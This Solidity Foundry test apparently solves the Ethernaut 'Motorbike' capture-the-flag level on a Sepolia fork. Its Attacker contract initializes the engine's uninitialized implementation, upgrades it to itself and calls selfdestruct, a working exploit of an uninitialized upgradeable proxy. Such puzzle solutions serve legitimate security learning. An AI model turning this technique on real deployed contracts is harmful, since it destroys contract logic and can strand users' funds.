// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";

interface Ethernaut{
    function createLevelInstance(address _level) external payable;
    function submitLevelInstance(address payable _instance) external;
    function statistics() external view returns (address);
}

interface Level{
    function createInstance(address _player) external payable returns (address);
}

interface Motorbike{
    function upgrader() external view returns (address);
    function horsePower() external view returns (uint256);
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
}

contract Attacker {
    function attack(address naut, address level, address engine) public {
        Ethernaut(naut).createLevelInstance(level);
        Motorbike engine = Motorbike(engine);
        engine.initialize();
        engine.upgradeToAndCall(address(this), abi.encodeWithSignature("killit()"));
    }

    function killit() public{
        selfdestruct(payable(msg.sender));
    }
}

contract MotorBikeTest is Test {
    function setUp() public {
        vm.createSelectFork("sepolia", 5469604);
    }

    function test_ethernautmotorbike() public {
        address naut = 0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6;
        address level = 0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6;
        // pre calculated address of the engine: address = rightmost_20_bytes(keccak256(RLP(level, nonce))) // nonce = 2437
        address engine = 0x7758a9f216e9c96559d8d62843Ad9cD86d3C8a83;
        address motorbike = 0x76F3c635Ae1486C781794E152aA3a2F886fF6F11;

        Attacker attacker =  new Attacker();
        attacker.attack(naut, level, engine);

        address upgrader = Motorbike(motorbike).upgrader();
        require(upgrader == address(0), "upgrader is gone");
    }
}
